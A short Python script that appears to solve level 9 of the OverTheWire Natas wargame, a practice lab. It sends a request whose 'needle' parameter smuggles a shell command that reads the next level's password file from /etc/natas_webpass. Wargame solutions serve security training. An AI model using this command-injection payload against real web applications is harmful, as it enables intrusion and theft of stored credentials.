#!/usr/bin/env python

import requests

URL = 'http://natas9.natas.labs.overthewire.org/index.php'
USERNAME = 'natas9'
PASSWORD = 'xxxxxxxxxxxxxxxxxxxxxx'
KEY = ''

ADDON = '?needle=Q; cat ../../../../etc/natas_webpass/natas10;ls'
r = requests.get(URL+ADDON, auth=(USERNAME, PASSWORD))
print(r.text)
